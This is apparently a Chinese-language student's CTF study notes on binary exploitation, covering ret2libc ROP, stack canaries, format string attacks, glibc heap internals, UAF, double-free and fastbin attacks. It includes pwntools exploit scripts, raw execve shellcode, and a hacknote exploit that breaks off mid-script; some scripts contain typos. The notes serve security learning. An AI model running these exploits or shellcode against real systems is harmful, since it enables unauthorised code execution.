alt="image-20230419203107813"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230419215529699.png" alt="image-20230419215529699"></p><p>【nop slide】<br>使得ASLR继续执行ret2shellcode<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230423182143460.png" alt="image-20230423182143460"></p><p>使执行流一直在nop段（maybe运气不好eip指不到nop位置 多运行几次即可）<br>core文件：记载程序崩溃时断点信息及错误信息<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230423193313158.png" alt="image-20230423193313158"></p><p>可以看成谁放的数据就为谁的栈帧<br>函数往上第二个字长写入其所需要的参数（大部分函数）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230423194347199.png" alt="image-20230423194347199"></p><p>system调用ret addr后自动push父函数ebp【函数内汇编第一步push ebp均向上写两字长到valuable】<br>最后两个函数执行此类模式即可完成攻击</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230423194601499.png" alt="image-20230423194601499"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230423194754995.png" alt="image-20230423194754995"></p><p>rop链将函数所需参数直接写入到上一函数的返回地址处<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424192129082.png" alt="image-20230424192129082"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230424194313669.png" alt="image-20230424194313669"></p><p>无”&#x2F;bin&#x2F;sh”也可映射 system函数地址（text段 plt）若无plt则需持续溢出直至出现真实地址<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424195822728.png"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424195913266.png"></p><p>我是小偷 无需exit（）【偷完就跑】🤭</p><pre><code>strings ret2libc1 | grep /bin/sh//string a.out | grep flag(简单逆向)</code></pre><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230424200850159.png" alt="image-20230424200850159"></p><p>【ret2libc1】<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424205359479.png" alt="image-20230424205359479"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424204704035.png" alt="image-20230424204704035"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424205428601.png" alt="image-20230424205428601">小小程序员&gt;&lt;<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424210938062.png" alt="image-20230424210938062"></p><p>动态调试108+4（ebp）溢出【ret2libc2】<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230425125354842.png" alt="image-20230425125354842"></p><p>无“&#x2F;bin&#x2F;sh” 此时需自行构造 在bss段找到可写入部分 </p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230425125119149.png" alt="image-20230425125119149">         </p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230425153257042.png" alt="image-20230425153257042"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230426210301792.png" alt="image-20230426210301792"></p><p>进阶版思路</p><pre><code class="python">from pwn import *io = process(&quot;./ret2libc2&quot;)gets_plt = 0x08048460system_plt = 0x08048490pop_ebx = 0x0804843dbuf2 = 0x804a080payload = flat([b&#39;a&#39;*112,gets_plt,pop_ebx,buf2,system_plt,0xdeadbeef(pop_ebx),buf2])#符合ret的寄存器均可不一定一定是pop_ebxio.seneline(payload)io.sendline(b&#39;/bin.sh&#39;)io.interactieve()</code></pre><p>【ret2libc3】</p><pre><code class="python"> v8 = strtol(&amp;buf, v4, v5); 将字符串转化为整数存储在v8里 long int strtol(const char *str, char **endptr, int base)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230427202338093.png" alt="image-20230427202338093"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230427202101873.png" alt="image-20230427202101873"><br>注意我们输送send的值要用str【程序接收的总是str】 linux系统下最小单位一叶（4kb）<br>&#x2F;bin&#x2F;sh(通过绝对地址输入bin中的sh)&#x3D;&#x3D;sh</p><pre><code class="python">from pwn import *io = process(&quot;./ret2libc3&quot;)elf = ELF(&quot;./ret2libc3&quot;)libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)#lld ret2libc3查看本地libc(动态)io.sendlineafter(b&quot; :&quot;,str(elf.got[&quot;puts&quot;]))#防bug与程序保持一致io.recvuntil(b&quot; :&quot;)libcBase = int(io.recvuntil(b&quot;\n&quot;,drop=True),16) - libc.symbols[&quot;puts&quot;]#drop=True不保留返回值（此处为接收但不保留\n）success(&quot;libcBase -&gt;&#123;:#x&#125;&quot;,format(libcBase))#用来debug 结果正确后进行打印 &#123;:#&#125;格式化字符串#format转换格式 前x表示转换为十六进制#oneGadget = libcBase + 0x3a9fc#payload = flat(cyclic(60),oneGadget)payload=flat(cyclic(60),libcBase+libc.symbols[&quot;system&quot;],0xdeadbeef,next(elf.search(b&quot;sh\x00&quot;)))io.sendlineafter(b&quot; :&quot;,payload)io.interactive()</code></pre><p>偏移：文件某一个位置距文件开头第一个字节距离</p><pre><code>one_gadget libc-2.23.so(动态链接文件名)-&gt;得偏移量 #碰运气喽😀</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230428193230160.png" alt="image-20230428193230160"></p><p>gdb调试<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230511094407053.png" alt="image-20230511094407053"></p><pre><code>set follow-fork-mode-parent 解决该问题（gdb中）</code></pre><p>x64环境下传参要先传入六个寄存器中（rdi rsi rdx rcx r8 r9 ）<br>劫持程序返回到目的函数之前要先把目的函数的参数传递完毕（即传递参数的gadget放在目标函数之前）任何时候数据的写入都是从低地址向高地址写入<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230520224921532.png" alt="image-20230520224921532"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230520225916659.png" alt="image-20230520225916659"></p><p>一般有jz跳转提示（一长串pop 寄存器）**[lib_csu]**</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230522173452594.png" alt="image-20230521000849599"></p><p>注意看地址（如图中edi只可写低八位）<br>libc泄露技巧：找到关键函数（如write【返回时有栈溢出】）对应的的plt下got 用函数的真实地址-函数在libc中的地址&#x3D;libc基地址 -&gt;找system+“&#x2F;bin&#x2F;sh”偏移传入泄露<br>【level3】<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230522173452594.png" alt="image-20230522173452594"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523002237695.png"></p><p>学会用转换捏io.recv(4&#x2F;8)</p><h3 id="【花式栈溢出】"><a href="#【花式栈溢出】" class="headerlink" title="【花式栈溢出】"></a><strong>【花式栈溢出】</strong></h3><p>1.程序中无真正main函数（dyn）<br>start-&gt;libc_start_mian-&gt;init-&gt;main<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523101555442.png" alt="image-20230523101555442"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523101634224.png" alt="image-20230523101634224"></p><p>此时栈中无栈帧 全部存储的shell里的环境变量 其中记录了当前执行程序的名字<br>找程序入口：IDA（可爱女人）main地址 gdbzho中下断点调试 stack查看栈帧<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523104215828.png" alt="image-20230523104215828"></p><p>checksecc 发现canary打开 <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523104710354.png" alt="image-20230523104710354"></p><p>运行程序 手动超长溢出（可利用python）查看提示 【可从IDA中辅助分析】</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523105629335.png" alt="image-20230523105629335"></p><p>之前为segment fault 现why为stack samshing<br>覆盖后触发stack_chk_fail函数 强行退出程序 -&gt;stack smashing</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523114523470.png" alt="image-20230523114523470"><br>如何在可爱女人中观察到Canary？<br>标志：段寄存器读入</p><pre><code>v4 = _readfsqword(0x28) //🌰</code></pre><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230523122130079.png" alt="image-20230523122130079"></p><p>Canary放置无硬性标准 需分析<br>elf文件较小时 地址可能在虚拟地址中映射两份<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230610163822498.png" alt="image-20230610163822498"></p><p>strip去掉函数名——&gt;防护程序 （IDA中自动用偏移作为函数名）<br>此时无“main”函数【gdb中断点下不了】</p><p><strong>【栈迁移】</strong></p><p>花样很多啦 栈欺骗<br>利用gadget覆盖ebp 恶意代码写在ebp中【pop ret&#x2F;mov esp，ebp】ebp辅佐esp<br>esp抹除数据 ebp增加 控制esp即可<br><strong>pwn3_x64</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230610182043459.png" alt="image-20230610182043459"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230610182053082.png" alt="image-20230610182053082"></p><p>write第三个参数无法获取时 运气（猜rdx&gt;8）</p><p>ret需要给显示屏即标准输出 1是标准输出的代号</p><p><strong>格式化字符串</strong>（保存在栈上）</p><pre><code class="c">#include &lt;stdio.h&gt;int main()&#123;char s[100];int a = 1;int b = 0x22222222;int c = -1;scanf(&quot;%s&quot;,s);printf(&quot;%08x.%08x.%08x.%s\n&quot;,a.b,c,s);//第一个参数即为格式化字符串（%08x.）printf(s);return 0;&#125;</code></pre><p>不给参数情况下 会直接将栈中内容进行打印</p><p>格式化字符串攻防中printf（”%s%s%s(足够长即可使得程序崩溃)”）</p><p><strong>字符串截断漏洞主体利用思想</strong>：</p><p> 截断符的篡改或抹去（让函数误解程序未执行完毕）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230615225648504.png" alt="image-20230615225648504"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230615225717582.png" alt="image-20230615225717582"></p><pre><code>%p溢出---&gt;实际将栈上重要数据进行打印（如地址）可用于绕过canary%s溢出---&gt;解析栈打印其中内容 ---&gt;泄露任意地址泄露任意地址：1.泄露栈上本身存在的地址（如read@got）2.泄露垃圾数据（篡改喽）再read@got</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230615232327380.png" alt="image-20230615232327380"></p><p>为避免flag和格式化字符串第一个参数距离很远直接传地址即可（printf（”%100$d”,a,b,c））</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616002416632.png" alt="image-20230616002416632"></p><pre><code class="c">#include&lt;stdio.h&gt;int main()&#123;int a = 1;int b = 2;int c = 3;printf(&quot;%3$d&quot;,a,b,c);//打印出3  $n---&gt;打印出第几个参数return 0;&#125;</code></pre><p>%d —-&gt;打印有符号整型  -140….对应0xf（要么为动态链接库中地址 要么为栈上地址）<br><img src="https://cdn.jsdelivr.net/gh/yub/First@main/image-20230616134523270.png" alt="image-20230616134523270"></p><p>逐参打印</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616134746197.png" alt="image-20230616134746197"></p><p>%n—-&gt;解析地址对应内容 —-写入前方已经打印成功的字符个数（任意地址写）<br>%n 写入4字节0x00000004<br>%hn写入两字节0x0004<br>%hhn写入一字节0x04<br>printf的第n+1个参数是格式化字符串的第n个参数<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616162630147.png" alt="image-20230616162630147"></p><p>0x0b &#x3D; 11也可以说明为第十一个参数<br>空行部分相当于对填入数据的打印<br>关键：找read函数判断写入数据为格式化字符串第几个参数<br>x86可以直接数 x64前6个参数在寄存器中第7个才在栈上</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616170955472.png" alt="image-20230616170955472"></p><p>x64直接利用找参数位置 可暴力打印%7$p%8$p%9$p(仅为举例)<br>前6个参数在寄存器中 rsp为第7个—&gt;对应n+1printf（flag）和n格式化字符串关系找到位置</p><p><strong>堆</strong><br>作用：给用户随时提供可使用的内存 用完后归还</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616174226840.png" alt="image-20230616174226840"></p><p>堆管理器—&gt;中间人</p><p>堆管理器并非由操作系统实现,而是由libc.so.6链接库实现。封装了一些系统调用﹐为用户提供方便的动态内存分配接口的同时﹐力求高效地管理由系统调用申请来的内存。</p><p>申请内存系统调用：<br>brk（data段末尾向上扩展调用）主线程系统调用<br>mmap（内存&#x2F;磁盘映射）</p><p>决定要素：主线程brk和mmap都可用<br>                   子线程只可用mmap<br>子线程申请空间过大在mmap段映射 小可直接在data段开辟<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616175743170.png" alt="image-20230616175743170"></p><p>malloc用户向堆管理器要内存 brk和mmap向操作系统申请</p><p><strong>arena</strong>（将物理内存映射到虚拟内存空间存储管理）<br>内存分配区，可以理解为堆管理器所持有的内存池</p><pre><code>操作系统--&gt;堆管理器--&gt;用户物理内存--&gt;arena--&gt;可用内存</code></pre><p>堆管理器与用户的内存交易发生于arena中（堆管理器向操作系统批发来的有冗余的内存库）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618233511677.png" alt="image-20230618233511677"></p><p><strong>chunk</strong>（内存分配的最小单位 不可能小于8字节【两字长16字节（x64）】x32大小）<br>用户申请内存的单位，也是堆管理器管理内存的基本单位<br>malloc（）返回的指针指向一个chunk的数据区域 chunk大小 大于malloc分配大小<br>chunk分配规律：只能分配字长整数倍大小—&gt;size低三位一定为0</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617134142917.png" alt="image-20230617134142917"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617140647896.png" alt="image-20230617140647896"></p><p>free chunk<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617234752208.png" alt="image-20230617234752208"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617143930107.png" alt="image-20230617143930107"></p><p>注意在size低三位有三个控制字段<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230617145200469.png" alt="image-20230617145200469"></p><p>A：主线程 M：是否为mmap P：用于free chunk（为1–&gt;前一个chunk被写入数据即前一个chunk为malloc chunk 为0则前一个chunk为free chunk）1–&gt;前一个chunk被占用 0–&gt;前一个chunk pre-in-use</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617152524631.png" alt="image-20230617152524631"></p><p>fastbin free chunk 四字段控制结构 smallbin free chunk 四字段控制结构<br>bigbin free chunk 六字段控制结构</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617215936729.png" alt="image-20230617215936729"><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618233738837.png" alt="image-20230618233738837"></p><p>fast bins独立于其他几个bins 压栈出栈即可<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617235205771.png" alt="image-20230617235205771"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617235515996.png" alt="image-20230617235515996"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617220021172.png" alt="image-20230617220021172"></p><p>large bin free chunk 6个字段全部用到<br>malloc chunk 用前两个<br>malloc chunk前面还是malloc chunk时只用到第二个字段<br>small bin free chunk allocated chunk用前4个字段<br>fast bin free chunk 用前3个字段<br>经过第一次malloc后堆管理器才完成初始化<br>页对齐 页的大小是4kb 4kb需要2^12映射空间 12bits为3bytes变成3个0<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617222745908.png" alt="image-20230617222745908"></p><p>x64最下chunk单位（0x20大小）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617222844117.png" alt="image-20230617222844117"></p><p>x86 同理得最小大小为0x10（切一半）<br>控制字段不可填写 堆管理器满足用户需求向操作系统申请0x100大小实际申请chunk大小为0x110（pre size+size 两字长 16bits 0x10大小）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617223313606.png" alt="image-20230617223313606"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617225749420.png" alt="image-20230617225749420"></p><pre><code class="c">#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123;void *ptr = malloc(0x100);free(ptr);&#125;</code></pre><p>malloc得到的函数指针指向size （图中）但chunk开头的地址是</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617230144174.png" alt="image-20230617230144174"></p><p>其他chunk为程序自身利用缓冲区提供（如：printf函数 【未指定stdout缓冲区时 printf函数默认用malloc得到一个堆中的缓冲区为stdout所用】）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617231321789.png" alt="image-20230617231321789"></p><p>程序读取时以一条语句为单位 size大小为申请的0x100+prev size+size（两字长）此时p已被程序员复用 即此时总size大小（总chunk大小 0x100为malloc chunk大小）为0x111</p><p><strong>previous size复用</strong><br>prev size针对free chunk 即存储上一个free chunk<br>当上一个chunk不为fastbin free chunk时（为malloc chunk）prev chunk可被复用<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617233352292.png" alt="image-20230617233352292"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617233454554.png" alt="image-20230617233454554"></p><p>以上变化chunk变化相同 8字节申请的大小为字长奇数倍分配空间&#x3D;申请到的字长数-1malloc分配空间大小<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618105030445.png" alt="image-20230618105030445"></p><p>0x100数据区域的大小 0x10为控制字段的大小 1 prev in use 位大小</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618105235986.png" alt="image-20230618105235986"></p><p>放在fast bin 中的free chunk仍会被标记为在使用中（fast bin p位恒为1）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618105723997.png" alt="image-20230618105723997"></p><p><strong>物理链表</strong>【相邻chunk间size域连接（整数）】</p><p>通过prev size串联起来（获取前一个chunk地址）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617234705813.png" alt="image-20230617234705813"></p><p><strong>逻辑链表</strong>（存在于bins中）【指针连接】<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618111056657.png" alt="image-20230618111056657"></p><p>每一个bin都含有对应的链表 构成的bins链表称为逻辑链表<br>同类chunk串联到回收站中 malloc索取相应大小时可高效从回收站中提取</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618111551403.png" alt="image-20230618111551403"></p><p><strong>bin</strong><br>（临时【系统需要时可用】）保存刚被free后内存区域的结构（堆管理器中）<br>管理arena中空闲chunk的结构<br>以数组的形式存在 数组元素为相应大小的chunk链表的链表头<br>存在于arena的malloc_state中<br>如：<br>unsorted bin<br>fast bins<br>small bins<br>large bins<br> (tcache)<br><strong>除fast bin和tcache为单向链表 其余bins均为双向链表</strong><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618230718261.png" alt="image-20230618230718261"><br>unsorted bin smallbin largebin双向链表结构bin利用:<br>🤖malloc分配时<br>🍰获取很大chunk时优先从回收站中拿取 unsorted bins变为sorted bins使用<br>双向链接：先进先出（图上自上而下malloc）<br>好处：队列底部压入数据 头部取出数据 一条链表就可处理数据<br>small bin（大小固定）<br>一个bin存储两个地址 物理内存中连续 把所有chunk串联</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618235211411.png" alt="image-20230618235211411"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618235427918.png" alt="image-20230618235427918"><br>large bins（大小不定【每一chunk大小不一】 最后一个chunk存储最后值）<br>大小为范围 —&gt;用两个额外的控制域记录数据<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618235448673.png" alt="image-20230618235448673"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618234942479.png" alt="image-20230618234942479"></p><p>fast bins可变为small bins（fast bin整体遍历检查时分类）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618235237538.png" alt="image-20230618235237538"></p><p>BK POINTER 域无实际作用<br>top chunk<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619151359619.png" alt="image-20230619151359619"></p><p> malloc state（fastbinsY+bins）在libc数据段管理主进程<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619120041795.png" alt="image-20230619120041795"></p><p><strong>什么样的chunk会进入usorted bins</strong><br>刚刚释放（超过fastbin大小）不能进入fastbins且未被分类的</p><p>超出fastbins可用大小利用过程：unsorted先乞讨 合并链接凑大小 small large一起来 实在不够喊top<br>先找sortedbins 不够触发sorted遍历 合并unsorted相邻chunk并分类<br>即利用时只要找到比用户申请大的chunk即可 剩余部分为last  remainder chunk转为fastbin部分最后进入unsorted bins</p><p><strong>UAF</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619160128310.png" alt="image-20230619160128310"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619160356676.png" alt="image-20230619160356676"></p><p>A free后的内存区</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619160410293.png" alt="image-20230619160410293"></p><p>在ree chunk和top chunk张放一个malloc chunk阻止两者合并（避免堆管理器的消耗）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619161430277.png" alt="image-20230619161430277"></p><p>c分配到a所在的内存区域中 占用利用</p><p>gdb偏移下断点方法</p><pre><code>b *$rebase(0x..)【偏移】</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619193114872.png" alt="image-20230619193114872"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619193556660.png" alt="image-20230619193556660"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619203856606.png" alt="image-20230619203856606"></p><p>第四次malloc后得到栈上地址（堆分配）</p><p>free a后<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619193754379.png" alt="image-20230619193754379"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619194533056.png" alt="image-20230619194533056"></p><p>防止double free漏洞（UAF）：控制内存的指针和内存均需清空 （chunk被清空但指针未清空）<br>意外：低权限指针可因使用同一块内存区域拥有高权限指针功能（若低权限指针篡改返回值高权限指针会无意识传送到pie中）</p><pre><code class="c">#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123; int * p = malloc(16); free(p); free(p); return 0;&#125;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619195914454.png" alt="image-20230619195914454"></p><p>tips：<br>1.glibc2.26&#x2F;2.27中无tache检查<br>2.fast bin会检查自身链表中每一个chunk大小是否为规定大小||新进入的chunk是否与上一个chunk重复（报double free 强制退出）</p><p>绕过：</p><pre><code class="c">#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123; int* p = malloc(16); malloc(16); int* ptr = malloc(16); free(p); free(ptr); free(p); return 0;&#125;</code></pre><p>fastbin_attack<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619202854520.png" alt="image-20230619202854520"></p><p>free后fd出现 此时此块chunk对于d来说为malloc chunk可被任意写入值（fd处）<br>fd写入一个stack值 诈骗fast bin过a后下一个free chunk在栈上 【任意霍霍实现】</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619203751739.png" alt="image-20230619203751739"><br>注意：fd始终指向下一个chunk开头地址 即stack对应栈上目标地址向上两个字长</p><p><strong>unsorted_bin_attcak</strong><br>可以把任意位置的地址篡改成较大的值（实际就是伪造chunk在栈上写一个大数值）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619205339973.png" alt="image-20230619205339973"></p><p>程序目标将var篡改为较大值<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619205857320.png" alt="image-20230619205857320"></p><p>unlink移除中间的chunk  新fd和bk中填入unsorted bin中值（fd和bk数据域写入unsorted 地址）最大0x7ff…<br><strong>house_of系列</strong><br>malloc总是接收一个无符号整数 输入负数相当于传入一个超大数<br>整数溢出（超大整数等效于一个负数）<br>top chunk起始地址 + malloc分配空间超出整数内存空间大小–丢弃超出32位部分（最高位）补0 剩下数字变很小（32位表示空间大小）</p><p>此时这个很小的数很可能落在data处（？）</p><p><strong>FSB&amp;USF例题</strong><br>(1)IDA观察<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620155645246.png" alt="image-20230620155645246"></p><p>scanf向v7、v8、v9写字符串（开辟的空间是连续的）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620161845271.png" alt="image-20230620161845271"></p><p>连续的三个字长缓冲区<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620162028689.png" alt="image-20230620162028689">发现程序标记提示进入对应漏洞查看<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620155732238.png" alt="image-20230620155732238"></p><p>格式化字符串<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620155800172.png" alt="image-20230620155800172"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620155817628.png" alt="image-20230620155817628"></p><p>free（s）清空了内存但指针未销毁但随着echo3执行完毕对应s栈帧销毁故无影响 但 cleanup（）函数free（0）对应uaf 即o内存被清空但指针未被销毁 此时再用另一指针与o指向同一内存空间即可获取主动权</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620174531638.png" alt="    ">吗 </p><p>surprise<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620201633271.png" alt="image-20230620201633271"></p><p>echo3free后s使用的空间最后还是留在对应得4字长chunk中  o最后一个参数写入shellcode（greeting） 首地址作为参数进行传参</p><pre><code class="python">from pwn import *p=process(&quot;./echo2&quot;)elf=ELF(&quot;./echo2&quot;)p.recvuntil(&quot;hey, what&#39;s your name? : &quot;)shellcode=b&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;p.sendline(shellcode)p.recvuntil(b&quot;&gt; &quot;)p.sendline(b&quot;2&quot;)payload=b&quot;%10$p&quot;+b&quot;A&quot;*3 #A用作标记p.sendline(payload)p.recvuntil(b&quot;0x&quot;)shellcode_addr=int(p.recvuntil(b&#39;AAA&#39;,drop=True),16)-0x20p.recvuntil(b&quot;&gt; &quot;)p.sendline(b&quot;4&quot;)p.recvuntil(b&quot;to exit? (y/n)&quot;)p.sendline(b&quot;n&quot;)p.recvuntil(b&quot;&gt; &quot;)p.sendline(b&quot;3&quot;)p.recvuntil(b&quot;hello \n&quot;)p.sendline(b&quot;A&quot;*24+p64(shellcode_addr))p.interactive()</code></pre><p><strong>hacknote（32位）</strong><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620231326851.png" alt="image-20230620231326851"></p><p>​                   <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620221606653.png" alt="image-20230620221606653"><br>add函数<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620221355683.png" alt="image-20230620221355683"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620220117301.png" alt="image-20230620220117301"></p><p>框住部分掌握控制信息 size对应的chunk可由用户自定义（uaf）control上未puts 下为sub</p><p>delete函数<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620222639346.png"></p><p>由下自上free两个chunk 但指针未被销毁 双free（uaf）<br>攻击第一步：<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620222239841.png" alt="image-20230620222239841"></p><p>malloc两次（写入垃圾数据的chunk+管理控制信息的chunk）</p><p>第二步<br>delete两个chunk 相同大小chunk进入同一fast bin self_puts第一个字长变为fd的第一个其他未变（包括指针）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620222903872.png"></p><p>malloc两次hou后<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620223247527.png" alt="image-20230620223247527"></p><p>传参用self_puts 地址  sub_chunk写入—&gt;puts_got<br>泄露</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620224148329.png" alt="image-20230620224148329"></p><p>print（0）对接远程的puts<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620230216527.png"></p><p>0此时保存的函数地址 获取0的地址进而利用两个chunk块<br>0中第一部分传入system地址（无可避免）用||（或）sh【前一条语句执行失败则执行sh】妙哉<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620230551936.png" alt="image-20230620230551936"></p><pre><code class="python">from pwn import * #p = remote(&quot;chall.pwnable.tw&quot;,10102)p=process(&quot;./hacknote&quot;)elf = ELF(&quot;./hacknote&quot;)libc = ELF(&quot;./libc_32.so.6&quot;)read_got = elf.got[&quot;read&quot;]pfputs = 0x804862b def add_note(size,index):      p.recvuntil(b&quot;choice :&quot;)      p.sendline(b&quot;1&quot;)      p.recvuntil(b&quot;size :&quot;)      p.sendline(size)      p.recvuntil(b&quot;Content :&quot;)      p.sendline(index) def delete_note(index):      p.recvuntil(b&quot;choice :&quot;)      p.sendline(b&quot;2&quot;)      p.recvuntil(b&quot;Index :&quot;)      p.sendline(index) def print_note(index):      p.recvuntil(b&quot;choice :&quot;)      